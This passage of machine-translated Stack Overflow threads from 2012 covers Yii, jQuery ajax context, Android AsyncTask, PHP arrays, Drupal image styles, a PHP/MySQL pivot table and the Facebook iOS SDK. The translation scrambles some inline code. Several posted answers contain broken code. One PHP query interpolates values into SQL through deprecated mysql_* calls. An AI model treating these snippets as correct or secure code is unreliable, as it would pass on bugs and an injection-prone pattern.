var postCreationStatus = this.model.create(newPostModel, {
    wait : true,    // waits for server to respond with 200 before adding newly created model to collection

    success : function(resp){
        console.log('success callback');
        console.log(resp);
        that.redirectHomePage();
    },
    error : function(err) {
        console.log('error callback');
        // this error message for dev only
        alert('There was an error. See console for details');
        console.log(err);
    }
}); 
```

# sql - 在 yii 中如何使用电子邮件字段查找用户的 id

> ID：13599486
> 
> 赞同：2
> 
> 时间：2012-11-28T06:57:15.363
> 
> 标签：sql, yii

在 yii 我正在开发功能。我正在通过查询检查用户输入的电子邮件 ID 是否存在于数据库中-

```
$record=User1::model()->find(array(
         'select'=>'primaryEmail',
         'condition'=>'PrimaryEmail=:email',
         'params'=>array(':email'=>$_POST['email']))
             ); 
```

如果记录存在，那么我想检索该记录的用户 ID 和 SecurityQuestionId。那么如何编写搜索查询。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T07:01:19.483

```
$record=User1::model()->find(array(
         'select'=>'id, securityQuestionId, primaryEmail',
         'condition'=>'primaryEmail=:email',
         'params'=>array(':email'=>$_POST['email']))
             ); 
```

要不就

```
$record = User1::model()->findByAttributes(array('primaryEmail' => $_POST['email'])); 
```

# javascript - jQuery ajax 上下文意外值

> ID：13599487
> 
> 赞同：1
> 
> 时间：2012-11-28T06:57:19.797
> 
> 标签：javascript, jquery, jquery-deferred

考虑以下在尝试提供上下文时使用 jQuery 的 ( *v1.8.3* )方法的示例。`ajax()`

```
for(var i=0; i<3; i++) {
  $.ajax({
    url: "foo",
    context: i,
    success: function() { console.log(this); }
} 
```

预期的输出将是 3 个`Number`对象，表示`0, 1 and 2`（不一定按该顺序）。事实上，控制台的输出是 2 个`Number`对象和 1 个`Object`对象，其中包含 ajax 请求数据。

```
> Number
> Object {url: "foo", isLocal: false, global: true, type: "GET", contentType: "application/x-www-form-urlencoded; charset=UTF-8"…}
> Number 
```

为什么我没有收到 3 个`Number`对象？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:57:19.797

在对 jQuery v1.8.3 源代码进行了一些挖掘之后，我发现了这个：

```
7645 | // Create the final options object
7646 | s = jQuery.ajaxSetup( {}, options ),
7647 | // Callbacks context
7648 | callbackContext = s.context || s, 
```

这意味着只要调用的`context`选项是虚假的，作为上下文参数`ajax()`分配给回调的值就是由.`this``jQuery.ajaxSetup()`

请注意，将*任何*虚假值作为`context`选项传递都会导致这种行为，`0`包括`null`和`""`。

我相信一个小小的改变可以消除这种歧义，我会向 jQuery 开发团队提交一张票，但是我不知道他们是否会欣赏一个打破一半互联网的向后不兼容的改变:(

```
callbackContext = s.context !== undefined ? s.context : s 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-29T22:52:51.307

它尝试将成功回调与上下文绑定（并将其转换为对象）。

所以，如果你提供一个数字，那么它会像这样绑定它：

```
 var a=12;
 var test = function(){ console.log(this.valueOf())}.bind(a)
 test(); 
```

您可以将 Ian 的技术用于“+this”而不是“this.valueOf()”，只是这也适用于字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T07:05:37.930

如果你尝试这样的事情有帮助吗？：

```
for (var i = 0; i < 3; i++) {
    (function () {
        $.ajax({
            url: "foo",
            context: i,
            success: function () {
                console.log(this);
            }
        });
    })(i);
} 
```

但是脱离 Esthete 发现的内容，也许您可​​以在定义 时转换为字符串`context`，然后再转换回`success`...内部的整数，例如：

```
for (var i = 0; i < 3; i++) {
    $.ajax({
        url: "foo",
        context: ""+i,
        success: function () {
            console.log(+this);
        }
    });
} 
```

但是，当然，这仅适用于您的代码，因为您使用的是这样的整数。如果您传递其他虚假值，则可能不会那么容易。

# android - 如何转换为异步任务？

> ID：13599489
> 
> 赞同：0
> 
> 时间：2012-11-28T06:57:22.213
> 
> 标签：android, multithreading, listview, android-asynctask

我的活动使用线程工作正常，但是当有 10 个或更多图像要从 Web 服务器数据库中获取时，它需要很多时间。通过谷歌搜索，我看到 asynctask 是一个更好的选择，但我无法实现它。这是我的线程类

```
public class Ongoing extends Activity implements OnItemClickListener{

InputStream is;
ProgressDialog pd;
public int limit=0;
String F_NAME[]=new String[1000];
String F_ID[]=new String[1000];
String F_IMG[]=new String[1000];
String F_DESC[]=new String[1000];
String F_DOWN[]=new String[1000];
ListView lv1;
ArrayList<ItemDetails> image_details;

@Override

public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  int SDK_INT = android.os.Build.VERSION.SDK_INT;

  if (SDK_INT>8)
  {

  StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

  StrictMode.setThreadPolicy(policy); 

  }

      setContentView(R.layout.submenu);

    lv1 = (ListView) findViewById(R.id.listV_main);

    lv1.setOnItemClickListener(this) ;
    pd=new ProgressDialog(this);
    pd.setTitle("Please wait");
    pd.setMessage("Loading....");
    pd.setCancelable(false);
    pd.show();

    new Thread(new Runnable()
    {
        @Override
        public void run()
        {

            GetSearchResults();

       //   hanlder.sendEmptyMessage(1);

             runOnUiThread(new Runnable() {
                 @Override
                 public void run() {
                     lv1 = (ListView) findViewById(R.id.listV_main);
                     adb=new ItemListBaseAdapter(Ongoing.this, results);
                     lv1.setAdapter(adb);
                     pd.cancel();
                 }
             });

        }
    }).start();

 }  
ItemListBaseAdapter adb;  
   private ArrayList<ItemDetails> results = new ArrayList<ItemDetails>();
private ArrayList<ItemDetails> GetSearchResults()
{
 try{ 
 String result = "";
try{
    HttpClient httpclient = new DefaultHttpClient();
    HttpPost httppost = new HttpPost(D.url+"abc.php");
    //httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    HttpResponse response = httpclient.execute(httppost); 
    HttpEntity entity = response.getEntity();
    is = entity.getContent();
    Log.e("log_tag", "connection success ");

   }catch(Exception e){
    Log.e("log_tag", "Error in http connection "+e.toString());

   }

 try{
  BufferedReader reader = new BufferedReader(new InputStreamReader(is,"iso- 88591"),8);
    StringBuilder sb = new StringBuilder();
    String line = null;
    while ((line = reader.readLine()) != null) {
            sb.append(line + "\n");

    }
    is.close();

    result=sb.toString();
  }catch(Exception e){
   Log.e("log_tag", "Error converting result "+e.toString());

  }

  try{

    JSONArray jArray = new JSONArray(result);
    int arrayLength=jArray.length();
    limit=arrayLength;
    for(int i=0;i<arrayLength;i++){
           JSONObject json_data = jArray.getJSONObject(i);

           F_NAME[i]=json_data.getString("F_NAME");
           F_DESC[i]=json_data.getString("F_DESC");
           F_ID[i]="ongopro"+json_data.getString("F_ID");
           F_IMG[i]=json_data.getString("F_IMG");
           F_DOWN[i]=json_data.getString("F_DOWNLOAD");
    }
   }
    catch(JSONException e){
        Log.e("log_tag", "Error parsing data "+e.toString());

  }                

    for(int j=0;j<limit;++j)
    {

         ItemDetails item_details = new ItemDetails();
        item_details.setName(F_NAME[j]);
        item_details.setItemDescription(F_DESC[j]);
        item_details.setImgUrl(F_IMG[j]);
        item_details.setLoc(F_DOWN[j]);
        results.add(item_details);
    }

 }
 catch(Exception e){
     Log.e("log_tag", "no msg sent "+e.toString());
     hanlder.sendEmptyMessage(2);

}
 return results;

}
@Override
 public void onItemClick(AdapterView<?> parent, View view,
      int position, long id) {
data.proj=F_DOWN[position];
 data.table=F_ID[position];
 data.flatname=F_NAME[position];

Intent newActivity = new Intent(view.getContext(),homescreen.class);     
    startActivity(newActivity);
  }} 
```

下面是 asynctask 中的代码（但它不起作用，请编辑它）

```
public class Ongoing extends Activity implements OnItemClickListener{

InputStream is;
ProgressDialog pd;
public int limit=0;
String F_NAME[]=new String[1000];
String F_ID[]=new String[1000];
String F_IMG[]=new String[1000];
String F_DESC[]=new String[1000];
String F_DOWN[]=new String[1000];
ListView lv1;
ArrayList<ItemDetails> image_details;
ItemListBaseAdapter adb;
@Override

public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  int SDK_INT = android.os.Build.VERSION.SDK_INT;

  if (SDK_INT>8)
  {

   StrictMode.ThreadPolicy policy = new    StrictMode.ThreadPolicy.Builder().permitAll().build();

  StrictMode.setThreadPolicy(policy); 

  }

      setContentView(R.layout.submenu);

    lv1 = (ListView) findViewById(R.id.listV_main);

    lv1.setOnItemClickListener(this) ;
    pd=new ProgressDialog(this);
    pd.setTitle("Please wait");
    pd.setMessage("Loading....");
    pd.setCancelable(false);
    pd.show();

    load task=new load();
    task.execute();

 }  

public class load extends AsyncTask<Void, Void , ArrayList<ItemDetails>>
{
    public ArrayList<ItemDetails> results = new ArrayList<ItemDetails>();
    @Override
    protected ArrayList<ItemDetails> doInBackground(Void... params) {

        String result = "";
        try{
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(D.url+"abc.php");
            //httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse response = httpclient.execute(httppost); 
            HttpEntity entity = response.getEntity();
            is = entity.getContent();
            Log.e("log_tag", "connection success ");

    }catch(Exception e){
            Log.e("log_tag", "Error in http connection "+e.toString());

    }
    //convert response to string
    try{
  BufferedReader reader = new BufferedReader(new InputStreamReader(is,"iso-8859-1"),8);
            StringBuilder sb = new StringBuilder();
            String line = null;
            while ((line = reader.readLine()) != null) {
                    sb.append(line + "\n");

            }
            is.close();

            result=sb.toString();
    }catch(Exception e){
           Log.e("log_tag", "Error converting result "+e.toString());

    }

    //parse json data

    try{

            JSONArray jArray = new JSONArray(result);
            int arrayLength=jArray.length();
            limit=arrayLength;
            for(int i=0;i<arrayLength;i++){
                   JSONObject json_data = jArray.getJSONObject(i);

                   F_NAME[i]=json_data.getString("F_NAME");
                   F_DESC[i]=json_data.getString("F_DESC");
                   F_ID[i]="ongopro"+json_data.getString("F_ID");
                   F_IMG[i]=json_data.getString("F_IMG")+"";
                   F_DOWN[i]=json_data.getString("F_DOWNLOAD");
            }
    }
            catch(JSONException e){
                Log.e("log_tag", "Error parsing data "+e.toString());

        }                

            for(int j=0;j<limit;++j)
            {

                 ItemDetails item_details = new ItemDetails();
                item_details.setName(F_NAME[j]);
                item_details.setItemDescription(F_DESC[j]);
                item_details.setImgUrl(F_IMG[j]);
                item_details.setLoc(F_DOWN[j]);
                results.add(item_details);
            }

         }
         catch(Exception e){
             Log.e("log_tag", "no msg sent "+e.toString());
             hanlder.sendEmptyMessage(2);

         return results;

    }
    protected void onPostExecute() {

         adb=new ItemListBaseAdapter(Ongoing.this, results);
        lv1.setAdapter(adb);
        pd.dismiss();

}
    @Override
    protected void onPreExecute() {
}}
  @Override
   public void onItemClick(AdapterView<?> parent, View view,
      int position, long id) {
data.proj=F_DOWN[position];
 data.table=F_ID[position];
 data.flatname=F_NAME[position];

Intent newActivity = new Intent(view.getContext(),homescreen.class);     
    startActivity(newActivity);
 }} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:08:55.757

检查这个我用 asynctask 编辑了你的代码

```
public class Ongoing extends Activity implements OnItemClickListener{

InputStream is;
ProgressDialog pd;
public int limit=0;
String F_NAME[]=new String[1000];
String F_ID[]=new String[1000];
String F_IMG[]=new String[1000];
String F_DESC[]=new String[1000];
String F_DOWN[]=new String[1000];
ListView lv1;
ArrayList<ItemDetails> image_details;

@Override

public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  int SDK_INT = android.os.Build.VERSION.SDK_INT;

  if (SDK_INT>8)
  {

  StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

  StrictMode.setThreadPolicy(policy); 

  }

      setContentView(R.layout.submenu);

    lv1 = (ListView) findViewById(R.id.listV_main);

    lv1.setOnItemClickListener(this) ;

   new Mytask.execute(null);

 }  
ItemListBaseAdapter adb;  
   private ArrayList<ItemDetails> results = new ArrayList<ItemDetails>();
private ArrayList<ItemDetails> GetSearchResults()
{
 try{ 
 String result = "";
try{
    HttpClient httpclient = new DefaultHttpClient();
    HttpPost httppost = new HttpPost(D.url+"abc.php");
    //httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    HttpResponse response = httpclient.execute(httppost); 
    HttpEntity entity = response.getEntity();
    is = entity.getContent();
    Log.e("log_tag", "connection success ");

   }catch(Exception e){
    Log.e("log_tag", "Error in http connection "+e.toString());

   }

 try{
  BufferedReader reader = new BufferedReader(new InputStreamReader(is,"iso- 88591"),8);
    StringBuilder sb = new StringBuilder();
    String line = null;
    while ((line = reader.readLine()) != null) {
            sb.append(line + "\n");

    }
    is.close();

    result=sb.toString();
  }catch(Exception e){
   Log.e("log_tag", "Error converting result "+e.toString());

  }

  try{

    JSONArray jArray = new JSONArray(result);
    int arrayLength=jArray.length();
    limit=arrayLength;
    for(int i=0;i<arrayLength;i++){
           JSONObject json_data = jArray.getJSONObject(i);

           F_NAME[i]=json_data.getString("F_NAME");
           F_DESC[i]=json_data.getString("F_DESC");
           F_ID[i]="ongopro"+json_data.getString("F_ID");
           F_IMG[i]=json_data.getString("F_IMG");
           F_DOWN[i]=json_data.getString("F_DOWNLOAD");
    }
   }
    catch(JSONException e){
        Log.e("log_tag", "Error parsing data "+e.toString());

  }                

    for(int j=0;j<limit;++j)
    {

         ItemDetails item_details = new ItemDetails();
        item_details.setName(F_NAME[j]);
        item_details.setItemDescription(F_DESC[j]);
        item_details.setImgUrl(F_IMG[j]);
        item_details.setLoc(F_DOWN[j]);
        results.add(item_details);
    }

 }
 catch(Exception e){
     Log.e("log_tag", "no msg sent "+e.toString());
     hanlder.sendEmptyMessage(2);

}
 return results;

}
@Override
 public void onItemClick(AdapterView<?> parent, View view,
      int position, long id) {
data.proj=F_DOWN[position];
 data.table=F_ID[position];
 data.flatname=F_NAME[position];

Intent newActivity = new Intent(view.getContext(),homescreen.class);     
    startActivity(newActivity);
  }

  private class MyTask extends AsyncTask
{

        Dialog dialog;

        @Override
        protected void onPreExecute() {
            // TODO Auto-generated method stub
            super.onPreExecute();
            dialog = new Dialog(yourclass.this);
            dialog.setTitle("Please wait");
            TextView tv = new TextView(yourclass.this.getApplicationContext());
            tv.setText("Loading...");
            dialog.setContentView(tv);
            dialog.show();
        }

        @Override
        protected Object doInBackground(Object... params)
        {
                    GetSearchResults();

        }

        @Override
        protected void onPostExecute(Object result) {
            // TODO Auto-generated method stub
            super.onPostExecute(result);
            if(dialog.isShowing())
                dialog.cancel();
                lv1 = (ListView) findViewById(R.id.listV_main);
                     adb=new ItemListBaseAdapter(Ongoing.this, results);
                     lv1.setAdapter(adb);
            Toast.makeText(getApplicationContext(), "Loaded Succesfully", Toast.LENGTH_LONG).show();

        }

    }

  } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:02:32.127

您只需将`GetSearchResults();`to`doInBackGround`和 ui 部分移动到`onPostExecute`..

例如：

```
protected String doInBackground(String... params) {
    GetSearchResults();
}

protected void onPostExecute(final String result) {
     lv1 = (ListView) findViewById(R.id.listV_main);
                 adb=new ItemListBaseAdapter(Ongoing.this, results);
                 lv1.setAdapter(adb);
                 pd.cancel();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T07:02:50.203

参考这些链接！-

1)[实现 AsyncTask 的技巧](https://stackoverflow.com/questions/6030057/tips-for-implementing-asynctask)

2)[处理程序 vs AsyncTask vs 线程](https://stackoverflow.com/questions/6964011/handler-vs-asynctask-vs-thread)

3) [AsyncTask Android 示例](https://stackoverflow.com/questions/9671546/asynctask-android-example)

希望能帮助到你。

# php - 选择要从数组中输出的值

> ID：13599490
> 
> 赞同：0
> 
> 时间：2012-11-28T06:57:27.653
> 
> 标签：php, arrays

我有这个来打印数组中的值。

```
<?php foreach ($product->data['attributes'] as $attribute => $option) {
   echo '<li>'. t('@attribute: @options', array('@attribute' => $attribute, '@options' => implode(', ', (array)$option))) .'</li>';
} ?> 
```

上面的代码打印了属性数组中的所有内容：

```
[products] => Array
    (
        [0] => stdClass Object
            (
                [data] => Array
                    (
                        [attributes] => Array
                            (
                                [Duration] => Array
                                    (
                                        [4] => 2 Years
                                    )

                                [Anchor Text] => Array
                                    (
                                        [0] => asdf
                                    )

                                [URL] => Array
                                    (
                                        [0] => asdddddd
                                    )

                                [Feed ID] => Array
                                    (
                                        [0] => 32845898
                                    )

                            )
                    )
            )

    ) 
```

我只想打印 [URL] 和 [Feed ID]...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:05:31.763

```
echo($product->data['attributes']['URL'])
echo($product->data['attributes']['Feed ID']) 
```

* * *

更新：

看起来您的个人“属性”的值本身就是数组。请尝试以下操作（它结合了数组的所有值，用逗号分隔）。

```
echo(implode(',', (array)$product->data['attributes']['URL']));
echo(implode(',', (array)$product->data['attributes']['Feed ID'])); 
```

# android - 向 Android 添加新字体的文档

> ID：13599492
> 
> 赞同：0
> 
> 时间：2012-11-28T06:57:36.190
> 
> 标签：android

计划在 Android Jelly Bean 中添加新的 Apache lincenced TTF 字体以支持 SE.Asian 语言环境。

浏览 Android 代码树。我发现 'Android/frameworks/base/data/fonts' 是添加文件和修改 make 文件的正确位置。

在提交补丁之前我可以参考任何文档吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-20T05:30:25.050

您需要修补 fallback_fonts.mk 和 fonts.mk 文件并添加您的字体。

这里给出的例子： [http ://review.cyanogenmod.org/#/c/29812/](http://review.cyanogenmod.org/#/c/29812/)

# android - 知道项目何时在网格视图中完成加载 BaseAdapter

> ID：13599493
> 
> 赞同：1
> 
> 时间：2012-11-28T06:57:36.300
> 
> 标签：android, gridview, baseadapter

我有一个使用 AsyncTask 填充动态适配器的 gridview，细节是 q 出现延迟的 gridview，我想知道您是否可以告诉何时完成填充 gridview 以在填充时显示进度条，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:03:55.570

如果您使用 AsyncTask，您将获得进度报告方法（对 ui 线程安全）和已完成方法（也是 ui 线程安全），您只需要覆盖它们，因为您的简单案例在任务开始之前显示进度并在完成时隐藏它。

# python - Python，生成素数双胞胎

> ID：13599497
> 
> 赞同：0
> 
> 时间：2012-11-28T06:57:53.893
> 
> 标签：python, sage

我试图编写一个 python 程序来生成 sage 中的素数双胞胎。

但是我似乎无法让它发挥作用。

代码： http: [//pastebin.com/PRnvJsf3](http://pastebin.com/PRnvJsf3)

Sage 给我以下错误信息：

```
Traceback (most recent call last):    y = 1
  File "", line 1, in <module>

  File "/private/var/folders/6-/6-7wRVdAEhuqw8H28uS60U+++TI/-Tmp-/tmp8b0dCT/___code___.py", line 19
    while s1[y] < s1[len(s1)]
                            ^
SyntaxError: invalid syntax 
```

谢谢我把缺少的冒号。

现在我明白了

Traceback（最近一次调用最后一次）：y = 1 文件“”，第 1 行，in

文件“/private/var/folders/6-/6-7wRVdAEhuqw8H28uS60U+++TI/-Tmp-/tmpEIEhQs/ ***code*** .py”，第 19 行 if (s1[k] + s1[y]) == ((s1 [k] + (s1[k] + _sage_const_2 )): ^ SyntaxError: 无效语法

谢谢，我也把缺少的括号

现在我明白了

Traceback（最近一次调用最后一次）：y = 1 文件“”，第 1 行，in

文件“/private/var/folders/6-/6-7wRVdAEhuqw8H28uS60U+++TI/-Tmp-/tmp9RE23a/ ***code*** .py”，第 18 行，在 while s1[y] < s1[len(s1)]: IndexError : 列表索引超出范围

嗯，我想我不能在这里使用 len(s1) 。

非常感谢，现在正在运行

而 s1[y] < s1[len(s1) - 1]：

然而，

s2 = s2 + s1[k] 似乎不是有效代码。

我得到下一个错误

Traceback（最近一次调用最后一次）：y = 1 文件“”，第 1 行，in

文件“/private/var/folders/6-/6-7wRVdAEhuqw8H28uS60U+++TI/-Tmp-/tmp3tx5on/ ***code*** .py”，第 20 行，在 s2 = s2 + s1[k] 文件“element.pyx”中，第 1525 行，在 sage.structure.element.RingElement 中。**添加**（sage/structure/element.c:13476）文件“coerce.pyx”，第 797 行，在 sage.structure.coerce.CoercionModel_cache_maps.bin_op (sage/structure/coerce.c:7678) TypeError: unsupported operand parent(s ) for '+': '' 和 'Integer Ring'

非常感谢

我发现了最后一个问题

我需要使用，现在它正在工作！

s2 = s2 + [s1[k]]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:04:53.933

您在以下行中有不平衡的括号：

```
if (s1[k] + s1[y]) == ((s1[k] + (s1[k] + 2)): 
```

我还注意到`x.is_prime()`. 我不知道这是否是 Sage 的东西，但我的独立 Python 解释器没有`int.is_prime()`方法。

最后，*总是*`s1[len(s1)]`会引发异常，因为的索引从零运行到。*`IndexError``s1``len(s1)-1`*

# java - 如何将 AI 写入我的应用程序

> ID：13599498
> 
> 赞同：0
> 
> 时间：2012-11-28T06:57:59.530
> 
> 标签：java, android, multithreading, thread-safety, game-ai

嘿，我正在编写一个 android 应用程序来玩一个简单的纸牌游戏（Dutch Blitz） 我已经制作了一个简单的算法，但我想知道我是否需要将 AI 作为新线程运行或以某种方式将其集成到主线程中，或者如果其他人有一些好主意，我很想听听他们...

感谢您的任何想法！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:16:58.767

是的，因为这是一个非常简单的纸牌游戏，您可以使用 AI 的主线程，也可以使用单独的线程。两者都将表现出相同的性能，因为 AI 的逻辑不会那么复杂 :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:23:00.770

我永远不会使用主线程进行 AI 评估，我不知道这个游戏“荷兰闪电战”，但你必须记住，在最弱的智能手机上，如果你的算法只有很小的机会接近 5（可能更像 4) 秒（阻塞 ui 线程），然后您的应用程序将被关闭。
所以 asynctask 是你应该做这样的事情的地方。

# image - Drupal：在哪里可以找到应用于图像字段的图像样式？有效地找到样式图像的 URL？

> ID：13599501
> 
> 赞同：0
> 
> 时间：2012-11-28T06:58:12.477
> 
> 标签：image, drupal

这个问题有两个部分。

首先，我需要找到一组样式图像的 url。我能够从 Druapl 表中找到这些图像的 URI。为了获取样式图像的 URL，我可以使用 Drupal 的 image_style_url(style, uri)。哪个drupal表存储了图像字段和样式的对应关系信息？

我还需要找到有效的这些 URL。除了为每个图像单独调用 image_style_url(style, uri) 之外还有其他方法吗？我可以通过数据库查询来获取 URL（关闭值），而不是多次调用 image_style_url(style, uri)。我相信每次调用 image_style_url 都会生成一个数据库查询，这样做的成本很高。

我正在使用 Drupal 7。

感谢您的任何输入！！！

干杯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T11:07:52.370

您可以在字段的实例设置中找到用于图像格式化程序的样式，如下所示：

```
$entity_type = 'node';
$field_name = 'field_some_field';
$bundle = 'page'; // for example

$info = field_info_instance($entity_type, $field_name, $bundle);

// Get the image style for a teaser display
$teaser_style = $info['display']['teaser']['settings']['image_style']; 
```

我会让您判断这是否足够有效，但是无论如何设置都存储在 db 表中的序列化 PHP 字符串中，因此您将无法以任何方式进行干净的选择在它。如果有比上述代码更短的方法来执行此操作，我会感到非常惊讶。

# php - 动态表问题

> ID：13599502
> 
> 赞同：1
> 
> 时间：2012-11-28T06:58:15.017
> 
> 标签：php, mysql, arrays

我正在尝试创建一个表，其数据表示如下：

```
Skills   | Project #1 | Project #2 | Project #3
Skill #1    Grade         Grade        Grade
Skill #2    Grade         Grade        Grade 
```

本质上，以 Project 开头的列是动态的，通过 SQL 查询获取并存储在数组中。

这些技能也是动态的并存储在数组中。然后每个技能的成绩应该反映它所在项目的成绩。

所有这些数据都在数据库中可用。我可以在一个查询中获取技能、项目和成绩。

我试图弄清楚如何使这项工作。现在，我只能弄清楚如何让技能和项目展示出来。不过，我不知道如何使它们与适当的等级相匹配。这就是我所拥有的

```
 $sql = "select skills.name as skillName, projects.name, projects_assessments.assessment  from skills
              INNER JOIN projects_assessments
              ON skills.id = projects_assessments.skillID
              INNER JOIN projects
              ON projects_assessments.projectID = projects.id
              WHERE projects_assessments.studentID = '{student}'
              AND skills.teacher = '{teacher}'";
        $result = mysql_query($sql) or die (mysql_error());
        while($row=mysql_fetch_array($result)) {
            $projects[] = $row['name'];
            $skills[] = $row['skillName'];
        }
        echo "<table><tr><th>Skill</th>";
        $projects = array_unique($projects);
        foreach($projects as $project) {
            echo "<th>$project</th>";
        }
        echo "
        </tr>";
        foreach($skills as $skill) {
            echo "<tr><td>$skill</td></tr>";
        }
        echo "
        </table> 
```

这将返回：

```
 Skills   | Project #1 | Project #2 | Project #3
   Skill #1                   
   Skill #2 
```

基本上我现在需要的是匹配每个技能的等级。该数据存储在 $row['assessment'] 中。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T06:42:57.930

只需在二维数组中构建表：

```
$table = array();
while ($row = mysql_fetch_array($result)) {
    $table[$row['skillName']][$row['name']] = $row['assessment'];
}

$firstRow = current($table);
// draw columns based on $firstRow

foreach ($table as $skillName => $projectList) {
    // start row
    foreach ($projectList as $assessment) {
        // start column with $assessment as value
    }
} 
```

**重要的**

确保正确排序行：

```
ORDER BY skillName, name; 
```

# jquery - 如何在单击 [Jquery] 时在另一个图像之上添加加载图像

> ID：13599508
> 
> 赞同：0
> 
> 时间：2012-11-28T06:59:03.493
> 
> 标签：jquery, image, get, loading

伙计们，我已经实现了一个横幅画廊，如下所述：

```
<div class="Container">
                <div class="Gallery">
                    <div class="GaleryLeftPanel">
                        <img id="img1" src="http://test-audioplanet.lumos.in.green.mysitehosted.com/Content/Public/images/1.png" style="z-index: 100" width="141"
                            height="140" alt="image 1" /></div>
                    <div class="GalleryMiddlePanel">
                        <img id="img2" src="http://test-audioplanet.lumos.in.green.mysitehosted.com/Content/Public/images/2.png" style="z-index: 99" width="141"
                            height="140" alt="image 2" /></div>
                    <div class="GaleryRightPanel">
                        <img id="img3" src="http://test-audioplanet.lumos.in.green.mysitehosted.com/Content/Public/images/3.png" style="z-index: 98" width="140"
                            height="140" alt="image 3" /></div>
                </div>
            </div>

$('img#img1').click(function () {
        var currentScr = $(this).attr('src');
        var second = $('img#img2').attr('src');
        var third = $('img#img3').attr('src');

        $('img#img3').attr('src', (second.indexOf("L") >= 0) ? second.replace('1L', '1').replace('2L', '2').replace('3L', '3') : second);
        $('img#img2').attr('src', currentScr.replace('1', '1L').replace('2', '2L').replace('3', '3L'));
        $('img#img1').attr('src', third);
    });

    $('img#img3').click(function () {
        var third = $(this).attr('src');
        var first = $('img#img1').attr('src');
        var second = $('img#img2').attr('src');

        $('img#img2').attr('src', third.replace('1', '1L').replace('2', '2L').replace('3', '3L'));
        $('img#img3').attr('src', first);
        $('img#img1').attr('src', (second.indexOf("L") >= 0) ? second.replace('1L', '1').replace('2L', '2').replace('3L', '3') : second);
}); 
```

您可以在以下小提琴中看到操作：

[http://jsfiddle.net/6HHkT/6/](http://jsfiddle.net/6HHkT/6/)

我需要的是，如果我单击第一个或第三个图像，我需要在第二个图像的顶部添加一个加载图像，直到它加载新图像。

请帮我..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:21:04.483

这个想法是为你的中间图像添加一个加载层。由你来为这个图层添加背景图像，我通常使用不透明度为 0.5 的白色 bkg 和加载轮。

然后，注册一个事件来捕获新的图像加载事件。我将此事件添加到演示的第一张图片中。

```
$('img#img2').addClass('loading');

//Append image load callback            
$('img#img1').on('load',function() {
    $('img#img2').removeClass('loading');
    //alert ("The image has loaded!");        
}); 
```

小提琴没有完全适应：http: [//jsfiddle.net/6HHkT/12/](http://jsfiddle.net/6HHkT/12/)

由于所有图像都已加载到浏览器缓存中，因此您将无法查看加载层。取消注释 alert() 函数以验证回调是否已被调用。

# ios - Facebook 3.1 SDK 与 iOS 4.3

> ID：13599517
> 
> 赞同：0
> 
> 时间：2012-11-28T06:59:42.510
> 
> 标签：ios, facebook

我试图让 Facebook 3.1 SDK 与 iOS 4.3+ 一起工作，并在应用程序从身份验证返回后显示一个对话框，但是我在验证和显示用于在旧版本 Facebook SDK 中工作的对话框时遇到了麻烦。
我已经阅读了 Facebook 文档，但有些不是很清楚，有些东西已经折旧，而另一些则不起作用。任何正确方向的帮助将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:10:24.727

如果您使用最新的 SDK，请尝试以下代码。

```
[FBSession openActiveSessionWithReadPermissions:[NSArray arrayWithObjects:@"read_stream", nil] allowLoginUI:YES
                              completionHandler:^(FBSession *session,
                                                  FBSessionState status,
                                                  NSError *error) {
                                  if (session.isOpen) {
                                      UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Success!" message:@"You logged in" delegate:nil cancelButtonTitle:nil otherButtonTitles:@"Ok", nil];
                                      [alertView show];
                                  }
                                  else if(status == FBSessionStateClosedLoginFailed) {
                                      UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Oops!" message:@"Loggin failed" delegate:nil cancelButtonTitle:nil otherButtonTitles:@"Ok", nil];
                                      [alertView show];
                                  }
                              }]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:06:17.040

1.在您的系统中安装最新的 facebook sdk 并在您的应用程序中安装 sdk 框架。

2.在您的应用程序delegate.m中添加以下代码

```
- (BOOL)application:(UIApplication *)application
            openURL:(NSURL *)url
  sourceApplication:(NSString *)sourceApplication
         annotation:(id)annotation {
    // attempt to extract a token from the url
    return [FBSession.activeSession handleOpenURL:url];
}
- (void)sessionStateChanged:(FBSession *)session
                      state:(FBSessionState) state
                      error:(NSError *)error
{
    switch (state) {
        case FBSessionStateOpen:
            if (!error) {
                // We have a valid session
                NSLog(@"User session found");
            }
            break;
        case FBSessionStateClosed:
        case FBSessionStateClosedLoginFailed:
            [FBSession.activeSession closeAndClearTokenInformation];
            break;
        default:
            break;
    }

    if (error) {
        UIAlertView *alertView = [[UIAlertView alloc]
                                  initWithTitle:@"Error"
                                  message:error.localizedDescription
                                  delegate:nil
                                  cancelButtonTitle:@"OK"
                                  otherButtonTitles:nil];
